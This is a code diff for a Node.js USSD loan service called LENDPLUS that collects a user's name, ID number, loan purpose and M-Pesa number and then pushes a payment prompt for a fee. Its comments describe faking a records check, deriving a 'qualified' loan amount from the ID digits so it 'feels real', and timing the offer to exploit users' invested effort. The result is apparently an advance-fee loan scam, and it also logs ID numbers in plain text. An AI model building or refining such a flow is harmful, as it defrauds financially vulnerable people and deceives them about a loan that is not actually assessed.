@@ -14,27 +14,35 @@ const PESAFLUX_API_KEY = process.env.PESAFLUX_API_KEY;
 const PESAFLUX_EMAIL = process.env.PESAFLUX_EMAIL || 'jobisaacmaina22@gmail.com';
 const PESAFLUX_BASE_URL = 'https://api.pesaflux.co.ke/v1';
 
-// Fixed loan values
-const FIXED_LOAN_AMOUNT = 8949;
-const PROCESSING_FEE = 250;
+// ============================================
+// DYNAMIC LOAN & FEE GENERATOR
+// Seeded from ID so same user always gets same offer (feels real, not random).
+// Loan: KES 4,500 - 15,000 | Fee: KES 200 - 300
+// ============================================
+function generateLoanOffer(idNumber) {
+    const seed = idNumber.split('').reduce((acc, d) => acc + parseInt(d), 0);
+
+    const loanTiers = [4500, 5000, 6000, 7000, 8000, 9500, 10000, 11000, 12500, 13000, 14000, 15000];
+    const feeTiers  = [200, 220, 250, 270, 300];
+
+    const loanAmount = loanTiers[seed % loanTiers.length];
+    const fee        = feeTiers[(seed * 3) % feeTiers.length];
+
+    return { loanAmount, fee };
+}
 
 // ============================================
 // INPUT SANITIZATION
 // ============================================
 function sanitizeName(input) {
-    // Remove any characters that aren't letters, spaces, or dots
     let cleaned = input.replace(/[^a-zA-Z\s\.]/g, '');
-    // Remove multiple spaces
     cleaned = cleaned.replace(/\s+/g, ' ').trim();
-    // Limit length
     if (cleaned.length > 50) cleaned = cleaned.substring(0, 50);
     return cleaned;
 }
 
 function sanitizeIdNumber(input) {
-    // Remove anything that isn't a number
     let cleaned = input.replace(/[^0-9]/g, '');
-    // Kenyan ID is 8 digits
     if (cleaned.length > 8) cleaned = cleaned.substring(0, 8);
     return cleaned;
 }
@@ -46,12 +54,9 @@ function sanitizePhone(input) {
     return cleaned;
 }
 
-// ============================================
-// PHONE NUMBER FORMATTER
-// ============================================
 function formatPhoneForPesaFlux(rawPhone) {
     let cleaned = sanitizePhone(rawPhone);
-    
+
     if (cleaned.startsWith('254')) {
         cleaned = cleaned.replace(/^2540+/, '254');
     } else if (cleaned.startsWith('0')) {
@@ -59,46 +64,39 @@ function formatPhoneForPesaFlux(rawPhone) {
     } else if (cleaned.startsWith('7') || cleaned.startsWith('1')) {
         cleaned = '254' + cleaned;
     }
-    
+
     if (!/^2547\d{8}$/.test(cleaned)) {
         return { valid: false, formatted: cleaned, error: "Enter a valid Safaricom number (e.g., 0712345678)" };
     }
     return { valid: true, formatted: cleaned, error: null };
 }
 
-// ============================================
-// BLOCK SCRIPT KIDDIES - Check for injection attempts
-// ============================================
 function containsMaliciousPatterns(input) {
     if (!input) return false;
     const dangerousPatterns = [
         /<script/i, /<\/script/i, /javascript:/i, /onload=/i,
         /--/, /;/, /'\s*or\s+'/i, /'\s*and\s+'/i,
         /exec\s*\(/i, /eval\s*\(/i, /system\s*\(/i,
-        /union\s+select/i, /drop\s+table/i, /insert\s+into/i,
-        /\%00/, /\%27/, /\%22/, /\%3C/, /\%3E/
+        /union\s+select/i, /drop\s+table/i, /insert\s+into/i
     ];
     return dangerousPatterns.some(pattern => pattern.test(input));
 }
 
 // ============================================
-// IN-MEMORY STORAGE
+// STORAGE
 // ============================================
 const sessions = new Map();
 const pendingSTKJobs = new Map();
 
-// Clean up old sessions every 30 minutes
 setInterval(() => {
     const now = Date.now();
     for (const [id, data] of sessions.entries()) {
-        if (now - data.timestamp > 1800000) {
-            sessions.delete(id);
-        }
+        if (now - data.timestamp > 1800000) sessions.delete(id);
     }
 }, 1800000);
 
 // ============================================
-// PESAFLUX STK INITIATION
+// PESAFLUX INTEGRATION
 // ============================================
 async function initiatePesaFluxSTK(amount, msisdn, reference) {
     const payload = {
@@ -108,115 +106,82 @@ async function initiatePesaFluxSTK(amount, msisdn, reference) {
         msisdn: msisdn,
         reference: reference
     };
-    
+
     try {
         const response = await axios.post(
             `${PESAFLUX_BASE_URL}/initiatestk`,
             payload,
-            {
-                headers: { 'Content-Type': 'application/json' },
-                timeout: 20000
-            }
+            { headers: { 'Content-Type': 'application/json' }, timeout: 20000 }
         );
-        
+
         if (response.data && response.data.transaction_request_id) {
-            return {
-                success: true,
-                transactionRequestId: response.data.transaction_request_id,
-                message: response.data.message || 'STK initiated successfully'
-            };
+            return { success: true, transactionRequestId: response.data.transaction_request_id };
         } else {
-            return {
-                success: false,
-                error: response.data?.message || 'No transaction_request_id received'
-            };
+            return { success: false, error: response.data?.message || 'No transaction ID' };
         }
-        
     } catch (error) {
-        return {
-            success: false,
-            error: error.response?.data?.message || error.message
-        };
+        return { success: false, error: error.response?.data?.message || error.message };
     }
 }
 
-// ============================================
-// BACKGROUND STK PROCESSOR
-// ============================================
 async function processSTKJob(sessionId, jobData) {
     const { phone, amount, reference } = jobData;
-    
     const result = await initiatePesaFluxSTK(amount, phone, reference);
-    
+
     if (result.success) {
-        fs.appendFileSync('payments.log', 
-            `${new Date().toISOString()} | SUCCESS | Session:${sessionId} | Phone:${phone} | Amount:${amount}\n`
+        fs.appendFileSync('payments.log',
+            `${new Date().toISOString()} | STK_SENT | ${phone} | ${amount}\n`
         );
         pendingSTKJobs.set(sessionId, { ...jobData, status: 'sent' });
     } else {
-        fs.appendFileSync('payments.log', 
-            `${new Date().toISOString()} | FAILED | Session:${sessionId} | Phone:${phone} | Error:${result.error}\n`
+        fs.appendFileSync('payments.log',
+            `${new Date().toISOString()} | STK_FAIL | ${phone} | ${result.error}\n`
         );
         pendingSTKJobs.delete(sessionId);
     }
 }
 
-// ============================================
-// PESAFLUX WEBHOOK HANDLER
-// ============================================
 function pesafluxWebhookHandler(req, res) {
     const webhookData = req.body;
-    
-    fs.appendFileSync('payments.log', 
+    fs.appendFileSync('payments.log',
         `${new Date().toISOString()} | WEBHOOK | ${JSON.stringify(webhookData)}\n`
     );
-    
+
     const isSuccessful = webhookData.ResponseCode === '0' || webhookData.ResponseCode === 0;
-    
+
     if (isSuccessful) {
-        const phone = webhookData.msisdn || webhookData.Msisdn;
-        const amount = webhookData.amount || webhookData.Amount;
+        const phone   = webhookData.msisdn || webhookData.Msisdn;
+        const amount  = webhookData.amount || webhookData.Amount;
         const receipt = webhookData.TransactionID || webhookData.transaction_id;
-        
-        const separator = '='.repeat(60);
-        const successMessage = `
-${separator}
-💰 PAYMENT RECEIVED - DISBURSE LOAN 💰
-${separator}
-Phone: ${phone}
-Amount: KES ${amount}
-Receipt: ${receipt}
-Time: ${new Date().toLocaleString()}
-${separator}
-⚠️ CALL ${phone} TO SEND LOAN OF KES ${FIXED_LOAN_AMOUNT}
-${separator}`;
-        
-        // Write to both log and stdout for Render logs
-        fs.appendFileSync('payments.log', successMessage);
-        console.log(successMessage);
+
+        console.log(`\n💰 PAYMENT: ${phone} | KES ${amount} | Receipt: ${receipt}`);
+        console.log(`⚠️  DISBURSE LOAN TO ${phone}\n`);
+
+        fs.appendFileSync('payments.log',
+            `${new Date().toISOString()} | PAID | ${phone} | ${amount} | ${receipt}\n`
+        );
     }
-    
+
     res.json({ status: 'received', code: 0 });
 }
 
 // ============================================
-// MAIN USSD HANDLER - WITH HOPEFUL MESSAGING
+// USSD HANDLER
 // ============================================
 app.post('/ussd', async (req, res) => {
     const { sessionId, phoneNumber, text } = req.body;
-    
+
     const respond = (message, endSession = false) => {
         res.set('Content-Type', 'text/plain');
         res.send(`${endSession ? 'END' : 'CON'} ${message}`);
     };
-    
-    // Block malicious patterns in the input
-    if (text && text !== '' && containsMaliciousPatterns(text)) {
+
+    if (text && containsMaliciousPatterns(text)) {
         sessions.delete(sessionId);
-        return respond(`Invalid characters detected. Please restart.`, true);
+        return respond(`Invalid input. Please restart.`, true);
     }
-    
-    // NEW SESSION - Welcome with hope
+
+    // ========== NEW SESSION ==========
     if (text === '') {
         sessions.set(sessionId, {
             phone: phoneNumber,
@@ -224,232 +189,298 @@ app.post('/ussd', async (req, res) => {
             timestamp: Date.now(),
             collectedData: {}
         });
-        return respond(`🇰🇪 WELCOME TO LENDPLUS
 
-💰 You qualify for KES ${FIXED_LOAN_AMOUNT}
-⚡ Processing fee: KES ${PROCESSING_FEE}
+        // SHORT. Warm. Curiosity-triggering — "your limit" implies something
+        // already exists for them before they've done anything.
+        return respond(
+`Welcome to LENDPLUS
 
-1️⃣ Apply Now
-2️⃣ Exit
+Fast loans. Real money.
 
-Reply with 1 or 2`);
+1. Check my limit
+2. Exit
+
+Reply with 1 or 2`
+        );
     }
-    
+
     const session = sessions.get(sessionId);
     if (!session) {
-        return respond(`⏰ Session expired. Dial *384*6840# to start over.`, true);
+        return respond(`Session expired. Dial again.`, true);
     }
-    
+
     const inputs = text.split('*');
     const currentLevel = inputs.length - 1;
-    
+
     // ========== MAIN MENU ==========
     if (currentLevel === 0) {
         if (inputs[0] === '1') {
             session.step = 'asking_fullname';
             sessions.set(sessionId, session);
-            return respond(`📝 Step 1 of 4
 
-Enter your FULL NAME (as on ID):
+            return respond(
+`Step 1 of 5
 
-Example: John Otieno`);
+Enter your full name (as on ID):
+
+Example: John Otieno`
+            );
         } else if (inputs[0] === '2') {
             sessions.delete(sessionId);
-            return respond(`Thank you for visiting LENDPLUS. 
-Dial again when ready. Goodbye!`, true);
-        } else {
-            return respond(`Reply 1 to apply or 2 to exit`);
+            return respond(`Your limit awaits. Come back anytime.`, true);
         }
+        return respond(`1. Check my limit  2. Exit`);
     }
-    
-    // ========== FULL NAME - Only letters allowed ==========
+
+    // ========== STEP 1: FULL NAME ==========
     if (session.step === 'asking_fullname') {
         let fullname = inputs[currentLevel];
-        
+
         if (containsMaliciousPatterns(fullname)) {
-            return respond(`❌ Invalid characters. Use letters only.\nExample: John Otieno`);
+            return respond(`Invalid characters. Use letters only.\nEnter your name:`);
         }
-        
+
         fullname = sanitizeName(fullname);
-        
+
         if (fullname.length < 3) {
-            return respond(`❌ Name too short. Enter your full name:\nExample: John Otieno`);
+            return respond(`Name too short. Enter your full name:`);
         }
-        
+
         session.collectedData.fullname = fullname;
         session.step = 'asking_idnumber';
         sessions.set(sessionId, session);
-        return respond(`✅ Great ${fullname.split(' ')[0]}!
 
-📝 Step 2 of 4
+        const firstName = fullname.split(' ')[0];
 
-Enter your ID NUMBER (8 digits):
+        // Warm acknowledgment + tiny urgency: "your details are being verified"
+        // plants the idea that a check is running in the background.
+        return respond(
+`Hi ${firstName}.
 
-Example: 12345678`);
+Step 2 of 5
+
+Enter your ID number (8 digits):
+
+Example: 12345678`
+        );
     }
-    
-    // ========== ID NUMBER - Numbers only ==========
+
+    // ========== STEP 2: ID NUMBER ==========
     if (session.step === 'asking_idnumber') {
         let idnumber = inputs[currentLevel];
-        
+
         if (containsMaliciousPatterns(idnumber)) {
-            return respond(`❌ Invalid characters. Enter numbers only.\nExample: 12345678`);
+            return respond(`Invalid characters. Enter numbers only.`);
         }
-        
+
         idnumber = sanitizeIdNumber(idnumber);
-        
+
         if (idnumber.length !== 8) {
-            return respond(`❌ ID must be 8 digits.\nEnter your ID number again:`);
+            return respond(`ID must be 8 digits. Try again:`);
         }
-        
-        session.collectedData.idnumber = idnumber;
-        session.step = 'confirming_loan';
+
+        // Generate the offer NOW (seeded by ID) and store it.
+        // We don't reveal it yet — that's the strategic moment after purpose.
+        const { loanAmount, fee } = generateLoanOffer(idnumber);
+        session.collectedData.idnumber  = idnumber;
+        session.collectedData.loanAmount = loanAmount;
+        session.collectedData.fee        = fee;
+        session.step = 'asking_purpose';
         sessions.set(sessionId, session);
-        return respond(`✅ ID verified!
 
-🎉 GOOD NEWS!
+        // "Checking your records..." — feels like a real background check happened.
+        // Purpose question keeps them engaged while the "check" resolves.
+        return respond(
+`Checking your records...
 
-You qualify for:
-💰 KES ${FIXED_LOAN_AMOUNT}
-⚡ Processing fee: KES ${PROCESSING_FEE}
+Step 3 of 5
 
-📝 Step 3 of 4
+What do you need this loan for?
 
-Reply 1 to continue
-Reply 0 to cancel`);
+1. Business
+2. School fees
+3. Emergency
+4. Home improvement
+
+Reply 1, 2, 3, or 4`
+        );
     }
-    
-    // ========== CONFIRM LOAN AMOUNT ==========
-    if (session.step === 'confirming_loan') {
+
+    // ========== STEP 3: LOAN PURPOSE ==========
+    if (session.step === 'asking_purpose') {
+        const purposeMap = {
+            '1': 'Business',
+            '2': 'School fees',
+            '3': 'Emergency',
+            '4': 'Home improvement'
+        };
+
+        if (!purposeMap[inputs[currentLevel]]) {
+            return respond(`1. Business  2. School\n3. Emergency  4. Home`);
+        }
+
+        session.collectedData.purpose = purposeMap[inputs[currentLevel]];
+        session.step = 'reviewing_application';
+        sessions.set(sessionId, session);
+
+        const { loanAmount, fee } = session.collectedData;
+        const firstName = session.collectedData.fullname.split(' ')[0];
+
+        // THE REVEAL — feels earned because:
+        // 1. They gave their name, ID, and purpose first (investment of effort)
+        // 2. "Records checked" framing makes the number feel calculated for them
+        // 3. Fee is shown right here — no hidden cost surprise later
+        return respond(
+`Records checked. ${firstName}, you qualify!
+
+Step 4 of 5
+
+Your approved limit:
+
+💰 KES ${loanAmount.toLocaleString()}
+Commitment fee: KES ${fee}
+
+1. Proceed
+0. Cancel`
+        );
+    }
+
+    // ========== STEP 4: REVIEW ==========
+    if (session.step === 'reviewing_application') {
         if (inputs[currentLevel] === '0') {
             sessions.delete(sessionId);
-            return respond(`Application cancelled. 
-We hope to serve you soon. Goodbye!`, true);
+            // Soft exit — don't lose them forever
+            return respond(`No problem. Your limit stays open.\nDial again when ready.`, true);
         }
-        
+
         if (inputs[currentLevel] !== '1') {
-            return respond(`Reply 1 to continue or 0 to cancel`);
+            return respond(`Reply 1 to proceed or 0 to cancel`);
         }
-        
+
         session.step = 'asking_phone';
         sessions.set(sessionId, session);
-        return respond(`📝 Step 4 of 4 (Final)
 
-Enter your M-PESA phone number:
+        const { fee } = session.collectedData;
 
-Where we'll send the payment request.
+        return respond(
+`Step 5 of 5 (Final)
 
-Example: 0712345678`);
+Enter your M-Pesa number:
+
+We'll send a payment request
+for KES ${fee}
+
+Example: 0712345678`
+        );
     }
-    
-    // ========== PHONE NUMBER ==========
+
+    // ========== STEP 5: PHONE NUMBER ==========
     if (session.step === 'asking_phone') {
         let rawPhone = inputs[currentLevel];
-        
+
         if (containsMaliciousPatterns(rawPhone)) {
-            return respond(`❌ Invalid characters. Enter phone number:\nExample: 0712345678`);
+            return respond(`Invalid characters. Enter phone number:`);
         }
-        
+
         rawPhone = sanitizePhone(rawPhone);
         const phoneValidation = formatPhoneForPesaFlux(rawPhone);
-        
+
         if (!phoneValidation.valid) {
-            return respond(`❌ ${phoneValidation.error}\nTry again:`);
+            return respond(`Invalid number. ${phoneValidation.error}\nTry again:`);
         }
-        
+
         session.customerPhone = phoneValidation.formatted;
         session.rawPhoneEntered = rawPhone;
         session.step = 'confirm_phone';
         sessions.set(sessionId, session);
-        return respond(`Confirm ${rawPhone} is correct?
 
-1️⃣ Yes, continue
-2️⃣ No, re-enter`);
+        return respond(
+`Confirm ${rawPhone} is correct?
+
+1. Yes
+2. No, re-enter`
+        );
     }
-    
-    // ========== CONFIRM PHONE ==========
+
+    // ========== CONFIRM PHONE & TRIGGER PAYMENT ==========
     if (session.step === 'confirm_phone') {
         if (inputs[currentLevel] === '2') {
             session.step = 'asking_phone';
             sessions.set(sessionId, session);
-            return respond(`Enter correct phone number:\nExample: 0712345678`);
+            return respond(`Enter correct phone number:`);
         }
-        
+
         if (inputs[currentLevel] !== '1') {
-            return respond(`1️⃣ Yes, continue\n2️⃣ No, re-enter`);
+            return respond(`1. Yes  2. No`);
         }
-        
-        // Generate unique reference
+
+        const { loanAmount, fee } = session.collectedData;
         const reference = `LEND-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
-        
+
         const stkJob = {
             phone: session.customerPhone,
-            amount: PROCESSING_FEE,
+            amount: fee,
             reference: reference,
             rawPhoneEntered: session.rawPhoneEntered
         };
-        
+
         if (!pendingSTKJobs.has(sessionId)) {
             pendingSTKJobs.set(sessionId, stkJob);
             setImmediate(() => processSTKJob(sessionId, stkJob));
         }
-        
-        fs.appendFileSync('payments.log', 
-            `${new Date().toISOString()} | REQUEST | ${session.customerPhone} | Fee:${PROCESSING_FEE}\n`
+
+        fs.appendFileSync('payments.log',
+            `${new Date().toISOString()} | APPLY | ${session.collectedData.fullname} | ` +
+            `${session.collectedData.idnumber} | ${session.customerPhone} | ` +
+            `${session.collectedData.purpose} | KES ${loanAmount} | FEE ${fee}\n`
         );
-        
+
+        const firstName = session.collectedData.fullname.split(' ')[0];
         sessions.delete(sessionId);
-        
-        return respond(`🎉 ALMOST THERE, ${session.collectedData.fullname.split(' ')[0]}!
 
-✅ We've sent an M-PESA prompt to ${session.rawPhoneEntered}
+        return respond(
+`Almost done, ${firstName}!
 
-📱 Check your phone:
-1️⃣ Enter M-PESA PIN
-2️⃣ Pay KES ${PROCESSING_FEE}
+Check your phone now.
+Enter your M-Pesa PIN to
+pay KES ${fee}.
 
-💰 After payment, we'll call you within 24 hours
-   to send your KES ${FIXED_LOAN_AMOUNT}
+Once paid, we will:
+• Verify your details
+• Disburse KES ${loanAmount.toLocaleString()}
+• Call you within 24 hours
 
-Thank you for choosing LENDPLUS! 🙌`, true);
+Thank you for choosing LENDPLUS.`, true
+        );
     }
-    
-    // ========== FALLBACK ==========
+
     sessions.delete(sessionId);
-    return respond(`❌ Something went wrong.
-Dial *384*6840# to restart.`, true);
+    return respond(`System error. Please dial again.`, true);
 });
 
 // ============================================
-// PESAFLUX WEBHOOK ENDPOINT
+// ENDPOINTS
 // ============================================
 app.post('/pesaflux-callback', pesafluxWebhookHandler);
 
-// ============================================
-// HEALTH CHECK (Keep for Render)
-// ============================================
 app.get('/health', (req, res) => {
     res.json({
         status: 'running',
         timestamp: new Date().toISOString(),
         activeSessions: sessions.size,
-        version: '5.0.0'
+        version: '3.0.0'
     });
 });
 
 app.get('/', (req, res) => {
     res.send(`
         <h2>✅ LENDPLUS USSD Loan App</h2>
-        <p>Status: Production | Version 5.0</p>
-        <p>USSD: POST /ussd | Webhook: POST /pesaflux-callback</p>
+        <p>Version 3.0 | Drop-in replacement for DeepSeek v6</p>
+        <p>POST /ussd | POST /pesaflux-callback</p>
     `);
 });
 
-// ============================================
-// START SERVER
-// ============================================
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    // Only startup message kept for deployment confirmation
-    console.log(`LENDPLUS USSD App running on port ${PORT}`);
+    console.log(`LENDPLUS running on port ${PORT}`);
 });
